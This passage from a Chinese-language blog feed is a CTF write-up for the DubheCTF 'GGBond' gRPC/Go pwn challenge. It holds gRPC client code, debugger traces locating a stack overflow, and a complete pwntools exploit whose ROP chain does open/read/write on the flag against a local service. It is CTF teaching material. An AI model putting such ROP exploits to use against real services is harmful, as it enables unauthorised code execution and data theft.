class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这么多看着还是云里雾里的，干脆让<code>gpt</code>写个例子</p><p><strong>RepeaterRequest</strong>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> grpc<span class="token keyword">import</span> ggbond_pb2<span class="token keyword">import</span> ggbond_pb2_grpc<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>repeater<span class="token operator">=</span>ggbond_pb2<span class="token punctuation">.</span>RepeaterRequest<span class="token punctuation">(</span>message<span class="token operator">=</span><span class="token string">'world'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 检查响应类型并相应地访问字段</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (WhoamiResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>whoami<span class="token punctuation">.</span>message<span class="token punctuation">)</span>        <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'role_change'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RoleChangeResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>role_change<span class="token punctuation">.</span>message<span class="token punctuation">)</span>        <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'repeater'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RepeaterResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>repeater<span class="token punctuation">.</span>message<span class="token punctuation">)</span>        <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (ErrorResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received an unknown type of response"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$python3</span> run.pyClient received <span class="token punctuation">(</span>RepeaterResponse<span class="token punctuation">)</span>: GGBOND: world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>WhoamiRequest</strong>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 发送 WhoamiRequest</span>whoami_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>WhoamiRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>whoami<span class="token operator">=</span>whoami_request<span class="token punctuation">)</span>response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$python3</span> run.py   Client received <span class="token punctuation">(</span>WhoamiResponse<span class="token punctuation">)</span>: I'm GGBOND<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>RoleChangeRequest</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">role_change_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>RoleChangeRequest<span class="token punctuation">(</span>role<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>role_change<span class="token operator">=</span>role_change_request<span class="token punctuation">)</span>response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-none"><code class="language-none">python3 run.pyClient received (RoleChangeResponse): New Role: SDaddy.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>测试（看了<code>wp</code>后）发现<code>changerole</code>为<code>3</code>时<code>RepeaterResponse</code>存在栈溢出（面向<code>wp</code>复现了属于是</p><p>拼拼凑凑写个<code>exp</code>用于交互的函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> grpc<span class="token keyword">import</span> ggbond_pb2<span class="token keyword">import</span> ggbond_pb2_grpccontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_response</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (WhoamiResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>whoami<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'role_change'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RoleChangeResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>role_change<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'repeater'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RepeaterResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>repeater<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (ErrorResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received an unknown type of response"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">RepeaterRequest</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>repeater<span class="token operator">=</span>ggbond_pb2<span class="token punctuation">.</span>RepeaterRequest<span class="token punctuation">(</span>message<span class="token operator">=</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">WhoamiRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        whoami_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>WhoamiRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>        request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>whoami<span class="token operator">=</span>whoami_request<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">RoleChangeRequest</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        role_change_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>RoleChangeRequest<span class="token punctuation">(</span>role<span class="token operator">=</span>num<span class="token punctuation">)</span>        request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>role_change<span class="token operator">=</span>role_change_request<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试试，<code>role</code>改成<code>3</code>发送<code>0x100</code>个<code>a</code>，会报段错误</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> cContinuing.Thread <span class="token number">4</span> <span class="token string">"pwn"</span> received signal SIGSEGV, Segmentation fault.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>而发送<code>0x10</code>个<code>a</code>时:</p><pre class="line-numbers language-none"><code class="language-none">Client received (RepeaterResponse): SDaddy: YBYB, YBBB.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加个<code>from base64 import</code>再编码后发<code>0x100</code>个<code>a</code>看看，成功控制了返回地址</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">► 0x7ee053    ret    &lt;0x6161616161616161&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看<code>rsp</code>看看多了多少个<code>a</code>判断溢出需要的长度</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> x/20gx 0xc00016b6f00xc00016b6f0:0x61616161616161610x61616161616161610xc00016b700:0x61616161616161610x61616161616161610xc00016b710:0x61616161616161610x61616161616161610xc00016b720:0x61616161616161610x1010101010100000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> p/x 0x100 - 0x38<span class="token variable">$2</span> <span class="token operator">=</span> 0xc8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最后<code>orw</code>，没开<code>pie</code>，看哪个地址顺眼找个地址<code>orw</code>,<code>read</code>和<code>write</code>的<code>fd</code>都是连蒙带猜，<code>exp</code>运行的时候<code>slepp(3)</code>来再<code>nc</code>一个到<code>23334</code>端口，最后的<code>write</code>也是定位到了这里</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$nc</span> localhost <span class="token number">23334</span>@DubheCTF<span class="token punctuation">&#123;</span>fake_flag<span class="token punctuation">&#125;</span> a� J�@2� J��*� J��*�<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> base64 <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">import</span> grpc<span class="token keyword">import</span> ggbond_pb2<span class="token keyword">import</span> ggbond_pb2_grpc<span class="token keyword">import</span> subprocess<span class="token keyword">import</span> oscontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">23334</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_response</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (WhoamiResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>whoami<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'role_change'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RoleChangeResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>role_change<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'repeater'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (RepeaterResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>repeater<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">elif</span> response<span class="token punctuation">.</span>HasField<span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received (ErrorResponse): "</span> <span class="token operator">+</span> response<span class="token punctuation">.</span>error<span class="token punctuation">.</span>message<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Client received an unknown type of response"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">RepeaterRequest</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>repeater<span class="token operator">=</span>ggbond_pb2<span class="token punctuation">.</span>RepeaterRequest<span class="token punctuation">(</span>message<span class="token operator">=</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">WhoamiRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        whoami_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>WhoamiRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>        request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>whoami<span class="token operator">=</span>whoami_request<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">RoleChangeRequest</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> grpc<span class="token punctuation">.</span>insecure_channel<span class="token punctuation">(</span><span class="token string">'localhost:23334'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> channel<span class="token punctuation">:</span>        stub <span class="token operator">=</span> ggbond_pb2_grpc<span class="token punctuation">.</span>GGBondServerStub<span class="token punctuation">(</span>channel<span class="token punctuation">)</span>        role_change_request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>RoleChangeRequest<span class="token punctuation">(</span>role<span class="token operator">=</span>num<span class="token punctuation">)</span>        request <span class="token operator">=</span> ggbond_pb2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>role_change<span class="token operator">=</span>role_change_request<span class="token punctuation">)</span>        response <span class="token operator">=</span> stub<span class="token punctuation">.</span>Handler<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        get_response<span class="token punctuation">(</span>response<span class="token punctuation">)</span>tty <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/dev/pts/1"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">,</span> buffering<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'nc'</span><span class="token punctuation">,</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">23334</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>tty<span class="token punctuation">,</span> stderr<span class="token operator">=</span>tty<span class="token punctuation">)</span>RoleChangeRequest<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x00000000004101e6</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401537</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x0000000000422398</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000461bd1</span>syscall <span class="token operator">=</span> <span class="token number">0x000000000040452c</span>flag <span class="token operator">=</span> <span class="token number">0x00000000007ef68d</span>addr <span class="token operator">=</span> <span class="token number">0xC56400</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xc8</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>RepeaterRequest<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目是一点看不懂，网上找&lt;code&gt;wp&lt;/code&gt;拼拼凑凑复现一下&lt;/p&gt;
&lt;p&gt;题目给了一个&lt;code&gt;docker&lt;/code&gt;和一个&lt;code&gt;pow.py&lt;/code&gt;，加注释版&lt;code&gt;pow.py&lt;/code&gt;：&lt;/p&gt;
&lt;pre class=&quot;line-</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="grpc" scheme="https://starrysky1004.github.io/tags/grpc/"/>
    
    <category term="golang" scheme="https://starrysky1004.github.io/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>kernel漏洞及利用</title>
    <link href="https://starrysky1004.github.io/2024/03/20/kernel-lou-dong-ji-li-yong/"/>
    <id>https://starrysky1004.github.io/2024/03/20/kernel-lou-dong-ji-li-yong/</id>
    <published>2024-03-20T15:51:59.000Z</published>
    <updated>2024-03-20T16:07:18.091Z</updated>
    
